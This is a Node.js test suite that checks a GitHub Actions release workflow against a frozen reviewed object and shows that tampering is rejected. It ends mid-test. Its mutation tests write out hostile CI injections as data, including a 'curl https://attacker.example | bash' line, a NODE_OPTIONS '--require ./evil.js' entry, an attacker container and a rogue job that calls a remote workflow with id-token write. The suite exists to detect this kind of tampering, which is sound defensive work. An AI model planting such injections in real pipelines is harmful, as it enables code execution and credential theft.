// Structural invariants for .github/workflows/release-pilot.yml (#70 Slice A).
//
// ROUND 7 ENDED THE REGEX PARSER. Rounds 2–6 each patched a text-level validator, and round 7
// demonstrated the limitation is architectural: a QUOTED job id appended at the end of the file was
// a real sixth job to YAML — carrying `id-token: write` and a remote reusable workflow — while the
// regex parser still reported five jobs and zero errors. Quoted env keys, quoted action inputs and
// job-level `container:` were equally invisible. A validator that parses a different language than
// the consumer does validates nothing.
//
// The authoritative check is now: parse the workflow ONCE with a real, pinned YAML parser
// (duplicate keys and malformed documents refused), and require the parsed object to EQUAL the
// reviewed object below, key for key, value for value. Semantic guards run on the same parsed
// object — never on text — both to give named diagnostics and to police future deliberate edits of
// the reviewed object itself. Comments are the one thing YAML cannot see, so the disclosure test
// alone still reads raw text.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { parseDocument } from 'yaml';

const here = dirname(fileURLToPath(import.meta.url));
const WORKFLOW = join(here, '..', '.github', 'workflows', 'release-pilot.yml');
const raw = fs.readFileSync(WORKFLOW, 'utf8');

/**
 * THE REVIEWED OBJECT. Any semantic change to the workflow — a key, a value, a step, a job — fails
 * the suite until this literal is updated deliberately, under review. Generated from the reviewed
 * YAML and frozen here; it is the closed schema, not a snapshot convenience.
 */
const EXPECTED_WORKFLOW = {
  "name": "Release Pilot",
  "on": {
    "workflow_dispatch": {
      "inputs": {
        "release_sha": {
          "description": "Full 40-character commit SHA to release; must be an ancestor of main",
          "required": true,
          "type": "string"
        },
        "mode": {
          "description": "dev_only stops after the dev stage; dev_then_pilot continues to pilot after it is green",
          "required": true,
          "type": "choice",
          "options": [
            "dev_only",
            "dev_then_pilot"
          ]
        }
      }
    }
  },
  "permissions": {
    "contents": "read"
  },
  "concurrency": {
    "group": "release-pilot-${{ inputs.release_sha }}",
    "cancel-in-progress": false
  },
  "jobs": {
    "global-preflight": {
      "name": "Release identity (shape, object type and ancestry)",
      "runs-on": "ubuntu-latest",
      "permissions": {
        "contents": "read"
      },
      "outputs": {
        "release_sha": "${{ steps.identity.outputs.release_sha }}"
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "main",
            "fetch-depth": 0,
            "persist-credentials": false
          }
        },
        {
          "name": "Validate release identity",
          "id": "identity",
          "env": {
            "RELEASE_SHA": "${{ inputs.release_sha }}"
          },
          "run": "set -euo pipefail\n# Shape FIRST, before any git invocation, and over ALL forty characters: a `[0-9a-f]*`\n# pattern validates only the first one, so \"a\" followed by 39 \"Z\"s passed it.\nif [ \"${#RELEASE_SHA}\" -ne 40 ] || [ -n \"${RELEASE_SHA//[0-9a-f]/}\" ]; then\n  echo \"::error::release_sha must be exactly 40 lowercase hex characters — a commit OID, never a ref name\"\n  exit 1\nfi\ngit fetch --quiet origin main\n# The object must BE a commit: a 40-hex tag or blob OID is not a release.\ntype=$(git cat-file -t \"$RELEASE_SHA\" 2>/dev/null || true)\nif [ \"$type\" != \"commit\" ]; then\n  echo \"::error::release_sha does not name a commit object in main's history\"\n  exit 1\nfi\nresolved=$(git rev-parse --verify \"$RELEASE_SHA^{commit}\")\nif [ \"$resolved\" != \"$RELEASE_SHA\" ]; then\n  echo \"::error::release_sha did not resolve to itself; refusing an ambiguous name\"\n  exit 1\nfi\nif ! git merge-base --is-ancestor \"$resolved\" origin/main; then\n  echo \"::error::release_sha is not an ancestor of main — only reviewed, merged commits are releasable\"\n  exit 1\nfi\n# Emit the RESOLVED OID, never the original input: downstream jobs pin to this output,\n# so a ref moved between validation and a later checkout has nothing left to move.\necho \"release_sha=$resolved\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "dev-preflight": {
      "name": "Deploy preflight (dev)",
      "needs": [
        "global-preflight"
      ],
      "if": "needs.global-preflight.result == 'success'",
      "runs-on": "ubuntu-latest",
      "environment": "dev",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "outputs": {
        "context_digest": "${{ steps.preflight.outputs.context_digest }}",
        "manifest": "${{ steps.preflight.outputs.manifest }}"
      },
      "defaults": {
        "run": {
          "working-directory": "infra/aws"
        }
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22,
            "cache": "npm",
            "cache-dependency-path": "infra/aws/package-lock.json"
          }
        },
        {
          "name": "Install dependencies",
          "run": "npm ci"
        },
        {
          "name": "Unit tests (context helpers and preflight)",
          "run": "npm test"
        },
        {
          "name": "Configure AWS credentials (read-only preflight role)",
          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
          "with": {
            "role-to-assume": "${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}",
            "aws-region": "${{ vars.AWS_REGION }}",
            "mask-aws-account-id": true
          }
        },
        {
          "name": "Evaluate PREFLIGHT-1 and PREFLIGHT-2",
          "id": "preflight",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "TARGET_REGION": "${{ vars.AWS_REGION }}",
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}",
            "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"
          },
          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-dev.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-dev.json\")\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "dev-stage": {
      "name": "Dev stage (not implemented in Slice A)",
      "needs": [
        "global-preflight",
        "dev-preflight"
      ],
      "if": "needs.dev-preflight.result == 'success'",
      "runs-on": "ubuntu-latest",
      "environment": "dev",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22
          }
        },
        {
          "name": "Verify the preflight manifest",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "CONTEXT_DIGEST": "${{ needs.dev-preflight.outputs.context_digest }}",
            "MANIFEST_JSON": "${{ needs.dev-preflight.outputs.manifest }}"
          },
          "run": "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"\n"
        },
        {
          "name": "Slice A stops here",
          "run": "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"\n"
        }
      ]
    },
    "pilot-preflight": {
      "name": "Deploy preflight (pilot)",
      "needs": [
        "global-preflight",
        "dev-preflight",
        "dev-stage"
      ],
      "if": "needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'",
      "runs-on": "ubuntu-latest",
      "environment": "pilot",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "outputs": {
        "context_digest": "${{ steps.preflight.outputs.context_digest }}",
        "manifest": "${{ steps.preflight.outputs.manifest }}"
      },
      "defaults": {
        "run": {
          "working-directory": "infra/aws"
        }
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22,
            "cache": "npm",
            "cache-dependency-path": "infra/aws/package-lock.json"
          }
        },
        {
          "name": "Install dependencies",
          "run": "npm ci"
        },
        {
          "name": "Configure AWS credentials (read-only preflight role)",
          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
          "with": {
            "role-to-assume": "${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}",
            "aws-region": "${{ vars.AWS_REGION }}",
            "mask-aws-account-id": true
          }
        },
        {
          "name": "Evaluate PREFLIGHT-1 and PREFLIGHT-2",
          "id": "preflight",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "TARGET_REGION": "${{ vars.AWS_REGION }}",
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}",
            "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"
          },
          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=pilot \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-pilot.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-pilot.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-pilot.json\")\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "pilot-stage": {
      "name": "Pilot stage (not implemented in Slice A)",
      "needs": [
        "global-preflight",
        "dev-stage",
        "pilot-preflight"
      ],
      "if": "needs.pilot-preflight.result == 'success'",
      "runs-on": "ubuntu-latest",
      "environment": "pilot",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22
          }
        },
        {
          "name": "Verify the preflight manifest",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "CONTEXT_DIGEST": "${{ needs.pilot-preflight.outputs.context_digest }}",
            "MANIFEST_JSON": "${{ needs.pilot-preflight.outputs.manifest }}"
          },
          "run": "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"\n"
        },
        {
          "name": "Slice A stops here",
          "run": "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"\n"
        }
      ]
    }
  }
};

/** Parse as the consumer does: real YAML, duplicate keys refused, warnings refused. */
export function parseWorkflow(text) {
  const doc = parseDocument(text, { uniqueKeys: true });
  if (doc.errors.length > 0 || doc.warnings.length > 0) {
    return { errors: [...doc.errors, ...doc.warnings].map((e) => `the workflow is not clean YAML [${e.code}]`) };
  }
  return { wf: doc.toJS() };
}

/** Every path at which two parsed objects differ — the diagnostic half of deep equality. */
function objectDiff(expected, actual, base = '') {
  if (expected === actual) return [];
  const isObj = (x) => x !== null && typeof x === 'object';
  if (!isObj(expected) || !isObj(actual) || Array.isArray(expected) !== Array.isArray(actual)) {
    return [base || '(root)'];
  }
  const paths = [];
  for (const key of new Set([...Object.keys(expected), ...Object.keys(actual)])) {
    const p = Array.isArray(expected) ? `${base}[${key}]` : base ? `${base}.${key}` : key;
    if (!(key in expected)) paths.push(`${p} (unreviewed addition)`);
    else if (!(key in actual)) paths.push(`${p} (reviewed content removed)`);
    else paths.push(...objectDiff(expected[key], actual[key], p));
  }
  return paths;
}

/** The ONLY success expressions a job may carry; see rounds 2–3 for why the grammar is closed. */
const IF_GRAMMAR =
  /^needs\.[A-Za-z_][\w-]*\.result == 'success'( && needs\.[A-Za-z_][\w-]*\.result == 'success')*( && inputs\.mode == 'dev_then_pilot')?$/;

/** Job-level keys that hand execution or environment to something nobody reviewed. */
const FORBIDDEN_JOB_KEYS = ['uses', 'container', 'services', 'env', 'strategy', 'secrets', 'continue-on-error'];

const DEPLOY_COMMAND = /\bcdk\s+deploy\b|\bopennextjs-cloudflare\s+deploy\b|\bwrangler\s+deploy\b/;

/**
 * Every rule, evaluated on the PARSED workflow.
 * @returns {string[]} one message per violation; empty means the workflow holds.
 */
export function releaseLaneErrors(text) {
  const parsed = parseWorkflow(text);
  if (parsed.errors) return parsed.errors;
  const wf = parsed.wf;
  const errors = [];

  // ---- the authoritative closed schema -------------------------------------------------------
  for (const p of objectDiff(EXPECTED_WORKFLOW, wf)) {
    errors.push(`the workflow differs from the reviewed object at ${p}`);
  }

  // ---- semantic guards, on the parsed object -------------------------------------------------
  // Redundant while the object equals the reviewed one — deliberately: they police future edits of
  // EXPECTED_WORKFLOW itself, and they give the named diagnostics the snapshot diff cannot.
  const on = wf.on ?? {};
  if (!on.workflow_dispatch || Object.keys(on).length !== 1) {
    errors.push('the lane must be triggered by workflow_dispatch and nothing else');
  }
  const jobs = wf.jobs ?? {};
  const ancestorsOf = (name, seen = new Set()) => {
    const needs = [].concat(jobs[name]?.needs ?? []);
    for (const n of needs) {
      if (!seen.has(n)) {
        seen.add(n);
        ancestorsOf(n, seen);
      }
    }
    return seen;
  };

  for (const [name, job] of Object.entries(jobs)) {
    for (const key of FORBIDDEN_JOB_KEYS) {
      if (job && Object.hasOwn(job, key)) {
        errors.push(`job "${name}" carries job-level ${key}, which hands execution to something unreviewed`);
      }
    }
    for (const step of job?.steps ?? []) {
      if (step.uses && !/@[0-9a-f]{40}$/.test(step.uses)) {
        errors.push(`job "${name}" pins an action to a mutable ref — a full commit SHA is required`);
      }
      if (typeof step.run === 'string' && DEPLOY_COMMAND.test(step.run)) {
        errors.push(`job "${name}" invokes a deploy command; Slice A deploys nothing and later slices go through deploy-release.js`);
      }
    }
    if (name === 'global-preflight') {
      if (job && Object.hasOwn(job, 'environment')) errors.push('global-preflight must not bind an Environment');
      continue;
    }
    if (typeof job?.if !== 'string' || !IF_GRAMMAR.test(job.if)) {
      errors.push(`job "${name}" has a success condition outside the closed grammar`);
    }
    if (!ancestorsOf(name).has('global-preflight')) errors.push(`job "${name}" does not descend from global-preflight`);
    if (job?.environment === 'pilot' && name !== 'pilot-preflight') {
      const a = ancestorsOf(name);
      if (!a.has('pilot-preflight')) errors.push(`pilot-bound job "${name}" does not descend from the pilot preflight`);
      if (!a.has('dev-stage')) errors.push(`pilot-bound job "${name}" does not descend from the green dev stage`);
    }
  }
  const pp = jobs['pilot-preflight'];
  if (!pp || ![].concat(pp.needs ?? []).includes('dev-stage')) {
    errors.push('pilot-preflight does not directly depend on the dev stage');
  }
  if (pp && !/inputs\.mode == 'dev_then_pilot'/.test(pp.if ?? '')) {
    errors.push('pilot-preflight is reachable without the operator asking for promotion');
  }

  return errors;
}

/* ================= the real file ================================================================ */

test('the release lane parses cleanly and EQUALS the reviewed object', () => {
  assert.deepEqual(releaseLaneErrors(raw), []);
});

test('YAML sees exactly the five reviewed jobs — the round-7 lesson, asserted at the source', () => {
  const { wf } = parseWorkflow(raw);
  assert.deepEqual(Object.keys(wf.jobs), ['global-preflight', 'dev-preflight', 'dev-stage', 'pilot-preflight', 'pilot-stage']);
  assert.deepEqual(Object.keys(wf), ['name', 'on', 'permissions', 'concurrency', 'jobs']);
});

test('Slice A deploys nothing: no run string contains a deploy command or the entrypoint', () => {
  const { wf } = parseWorkflow(raw);
  for (const [name, job] of Object.entries(wf.jobs)) {
    for (const step of job.steps ?? []) {
      if (typeof step.run !== 'string') continue;
      assert.equal(DEPLOY_COMMAND.test(step.run), false, `${name} must not deploy in Slice A`);
      assert.equal(step.run.includes('deploy-release.js'), false, `${name} must not invoke the entrypoint in Slice A`);
    }
  }
});

test('the human gate is DECLARED but not yet real, and the file says so', () => {
  // Comments are the one thing YAML cannot see; the disclosures live there, so this reads raw text.
  assert.match(raw, /THE HUMAN GATE IS NOT YET REAL/);
  assert.match(raw, /ZERO configured GitHub/);
  assert.match(raw, /treated as ungated, and no deploy slice may be approved/);
  assert.match(raw, /BOTH Environments must restrict deployment branches to main only/);
  assert.match(raw, /`pilot` additionally requires the designated reviewer/);
  assert.match(raw, /executes the workflow\n# DEFINITION from the branch the operator selects/);
});

/* ================= mutations ==================================================================== */

const rejects = (mutated, why) => {
  assert.notEqual(mutated, raw, `mutation did not apply: ${why}`);
  assert.notDeepEqual(releaseLaneErrors(mutated), [], `must be rejected: ${why}`);
};

/** The round-7 payloads must be PROVEN ACTIVE under YAML before their rejection means anything. */
const activeAt = (mutated, probe) => {
  const { wf, errors } = parseWorkflow(mutated);
  if (errors) return { parseRefused: true };
  return { value: probe(wf) };
};

test('POSITIVE CONTROL: every reproduction from the round-7 review is rejected by name', () => {
  // (a) A QUOTED env key on a reviewed step. Invisible to the old regex; real to YAML.
  const quotedEnv = raw.replace(
    '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}',
    '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}\n          "NODE_OPTIONS": --require ./evil.js',
  );
  assert.equal(
    activeAt(quotedEnv, (wf) => wf.jobs['dev-preflight'].steps.at(-1).env.NODE_OPTIONS).value,
    '--require ./evil.js',
    'YAML must parse the quoted env key as ACTIVE configuration — that is the whole finding',
  );
  rejects(quotedEnv, 'a quoted NODE_OPTIONS env key');

  // (b) A QUOTED action input.
  const quotedWith = raw.replace(
    '          mask-aws-account-id: true',
    '          mask-aws-account-id: true\n          "role-duration-seconds": 43200',
  );
  assert.equal(
    activeAt(quotedWith, (wf) => wf.jobs['dev-preflight'].steps.find((s) => s.uses?.startsWith('aws-actions/')).with['role-duration-seconds']).value,
    43200,
  );
  rejects(quotedWith, 'a quoted action input');

  // (c) Job-level env, and a job-level container.
  const jobEnv = raw.replace(
    '  dev-stage:\n    name: Dev stage (not implemented in Slice A)',
    '  dev-stage:\n    env:\n      NODE_OPTIONS: --require ./evil.js\n    name: Dev stage (not implemented in Slice A)',
  );
  assert.equal(activeAt(jobEnv, (wf) => wf.jobs['dev-stage'].env.NODE_OPTIONS).value, '--require ./evil.js');
  rejects(jobEnv, 'a job-level env block');

  const container = raw.replace(
    '  dev-stage:\n    name: Dev stage (not implemented in Slice A)',
    '  dev-stage:\n    container: attacker/example:latest\n    name: Dev stage (not implemented in Slice A)',
  );
  assert.equal(activeAt(container, (wf) => wf.jobs['dev-stage'].container).value, 'attacker/example:latest');
  rejects(container, 'a job-level container');

  // (d) The QUOTED sixth job calling a remote reusable workflow — five jobs to the old parser,
  // six to YAML, with id-token: write.
  const rogue = `${raw}\n  "rogue":\n    permissions:\n      contents: read\n      id-token: write\n    uses: attacker/example/.github/workflows/release.yml@main\n`;
  assert.equal(
    activeAt(rogue, (wf) => wf.jobs.rogue.uses).value,
    'attacker/example/.github/workflows/release.yml@main',
    'YAML must parse the quoted job id as a real sixth job',
  );
  const rogueErrors = releaseLaneErrors(rogue);
  assert.ok(rogueErrors.some((e) => e.includes('jobs.rogue')), 'the diff must name the rogue job');
  assert.ok(rogueErrors.some((e) => e.includes('job-level uses')), 'the reusable-workflow call must be refused by its own rule too');

  // And a duplicate key — two `permissions:` mappings at the top level — is refused at parse time.
  const dup = raw.replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\npermissions:\n  contents: read\n');
  assert.notEqual(dup, raw);
  assert.ok(releaseLaneErrors(dup).some((e) => e.includes('not clean YAML')), 'duplicate keys must refuse at parse time');
});

test('POSITIVE CONTROL: release identity cannot be weakened', () => {
  rejects(raw.replace(' || [ -n "${RELEASE_SHA//[0-9a-f]/}" ]', ''), 'the whole-string charset check removed');
  rejects(raw.replace('          type=$(git cat-file -t "$RELEASE_SHA" 2>/dev/null || true)\n', '          type=commit\n'), 'the commit-object proof removed');
  rejects(raw.replace('if ! git merge-base --is-ancestor "$resolved" origin/main; then', 'if false; then'), 'the ancestry check removed');
  rejects(raw.replace('release_sha=$resolved', 'release_sha=$RELEASE_SHA'), 'the raw input emitted instead of the resolved OID');
  rejects(raw.replace('          ref: main\n          fetch-depth: 0\n', '          ref: ${{ inputs.release_sha }}\n'), 'the identity job checks out the unvalidated candidate');
  rejects(
    raw.replace('  global-preflight:\n    name: Release identity (shape, object type and ancestry)\n    runs-on: ubuntu-latest\n', '  global-preflight:\n    name: Release identity (shape, object type and ancestry)\n    runs-on: ubuntu-latest\n    environment: dev\n'),
    'the identity job can read environment configuration',
  );
});

test('POSITIVE CONTROL: pinning, inputs, gating and credentials cannot be loosened', () => {
  rejects(raw.replaceAll('          ref: ${{ needs.global-preflight.outputs.release_sha }}\n', ''), 'unpinned checkouts');
  rejects(raw.replaceAll('ref: ${{ needs.global-preflight.outputs.release_sha }}', 'ref: ${{ inputs.release_sha }}'), 'checkouts pinned to the raw input');
  rejects(raw.replaceAll('          persist-credentials: false\n', ''), 'checkouts persist credentials');
  rejects(raw.replace('      mode:', '      environment:\n        description: x\n        required: true\n        type: string\n      mode:'), 'an environment input');
  rejects(raw.replace('      mode:', '      auth_callback_urls:\n        description: x\n        required: true\n        type: string\n      mode:'), 'a caller-supplied URL input');
  rejects(raw.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n    branches: [main]\n  workflow_dispatch:'), 'an automatic trigger');
  rejects(raw.replace("    if: needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'", "    if: needs.global-preflight.result == 'success'"), 'pilot entry without the dev stage or the mode');
  rejects(raw.replace('\n    needs: [global-preflight, dev-preflight, dev-stage]', '\n    needs: [global-preflight]'), 'pilot-preflight detached from the dev stage');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", "    if: needs.dev-preflight.result == 'success' || true\n    runs-on"), '|| true');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    if: always()\n    runs-on'), 'always()');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    runs-on'), 'a dependency with no explicit success condition');
  rejects(raw.replaceAll('secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN', 'vars.AWS_DEPLOY_PREFLIGHT_ROLE_ARN'), 'the role ARN moved to a variable');
  rejects(raw.replaceAll('          mask-aws-account-id: true\n', ''), 'account-id masking removed');
  rejects(raw.replace('${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}', `arn:aws:iam::${'9'.repeat(12)}:role/x`), 'a literal IAM ARN');

  // The pin rule keeps ITS OWN error: the schema diff would flag the unknown value anyway, and a
  // control satisfied by that redundancy goes green when the pin rule is deleted.
  const tagged = raw.replace('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7', 'actions/checkout@v7');
  assert.notEqual(tagged, raw);
  assert.ok(releaseLaneErrors(tagged).some((e) => e.includes('mutable ref')), 'a tag reference must be refused by the pin rule itself');
});

test('POSITIVE CONTROL: reviewed step objects cannot grow properties, env entries or new commands', () => {
  rejects(
    raw.replace(
      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"",
      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\n          curl -s https://attacker.example | bash",
    ),
    'a template with an injected line',
  );
  rejects(
    injectDevStep('      - name: Deploy\n        run: |\n          verb=deploy\n          npx cdk "$verb" --all'),
    'verb=deploy; npx cdk "$verb" --all',
  );
  rejects(
    injectDevStep('      - name: Deploy\n        uses: someorg/cdk-deploy-action@v1\n        with:\n          stacks: all'),
    'a deploy action outside the reviewed object',
  );
  rejects(
    injectDevStep('      - name: Sneak\n        run: npx cdk deploy --all'),
    'a single-line run outside the reviewed object',
  );
  rejects(
    raw.replace('      - name: Slice A stops here\n        run: |', '      - name: Slice A stops here\n        shell: python\n        run: |'),
    'a shell override on a reviewed run step',
  );
  rejects(
    raw.replace(
      '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}',
      '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}\n          NODE_OPTIONS: --require ./evil.js',
    ),
    'NODE_OPTIONS smuggled into a reviewed run step',
  );
});

/** Replace the dev stage's terminal step with an arbitrary injected step, for bypass mutations. */
function injectDevStep(step) {
  return raw.replace(
    /      - name: Slice A stops here\n        run: \|\n          echo "Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,"\n          echo "no account mutation and no paid call happened in this run."\n\n  # -+\n  # PILOT PREFLIGHT/,
    `${step}\n\n  # x\n  # PILOT PREFLIGHT`,
  );
}

/* ================= the identity script, EXECUTED =============================================== */
//
// A shell pattern can only be trusted by running it: the committed `[0-9a-f]*` check accepted "a"
// followed by 39 uppercase Zs, and no text assertion saw it. The script is taken from the PARSED
// object — the same string GitHub would execute — and run under a stubbed git.

function identityScript() {
  const { wf } = parseWorkflow(raw);
  const step = wf.jobs['global-preflight'].steps.find((s) => s.name === 'Validate release identity');
  assert.ok(step && typeof step.run === 'string', 'the identity step exists in the parsed object');
  return step.run;
}

function runIdentity({ sha, type = 'commit', resolved = '', ancestorExit = 0 }) {
  const script = identityScript();
  const dir = fs.mkdtempSync(join(os.tmpdir(), 'cba-identity-'));
  try {
    const calls = join(dir, 'calls.log');
    fs.writeFileSync(calls, '');
    fs.writeFileSync(
      join(dir, 'git'),
      [
        '#!/usr/bin/env bash',
        'echo "$*" >> "$GIT_CALLS"',
        'last="${@: -1}"',
        'case "$1" in',
        '  fetch) exit 0 ;;',
        '  cat-file)',
        '    if [ "$GIT_TYPE" = "missing" ]; then exit 128; fi',
        "    printf '%s\\n' \"$GIT_TYPE\" ;;",
        '  rev-parse)',
        "    oid=$(printf '%s' \"$last\" | sed 's/\\^{commit}$//')",
        "    if [ -n \"$GIT_RESOLVED\" ]; then printf '%s\\n' \"$GIT_RESOLVED\"; else printf '%s\\n' \"$oid\"; fi ;;",
        '  merge-base) exit "$GIT_ANCESTOR_EXIT" ;;',
        '  *) exit 1 ;;',
        'esac',
        '',
      ].join('\n'),
      { mode: 0o755 },
    );
    const outFile = join(dir, 'github-output');
    fs.writeFileSync(outFile, '');
    const res = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${dir}:${process.env.PATH}`,
        RELEASE_SHA: sha,
        GITHUB_OUTPUT: outFile,
        GIT_CALLS: calls,
        GIT_TYPE: type,
        GIT_RESOLVED: resolved,
        GIT_ANCESTOR_EXIT: String(ancestorExit),
      },
    });
    return { status: res.status, calls: fs.readFileSync(calls, 'utf8'), out: fs.readFileSync(outFile, 'utf8') };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const OID = 'a'.repeat(40);

test('EXECUTED: the exact round-2 value — "a" plus 39 uppercase Zs — is refused before git runs', () => {
  const r = runIdentity({ sha: `a${'Z'.repeat(39)}` });
  assert.notEqual(r.status, 0);
  assert.equal(r.calls, '', 'the shape check must refuse BEFORE any git invocation');
});

test('EXECUTED: short values and ref-shaped names never reach git', () => {
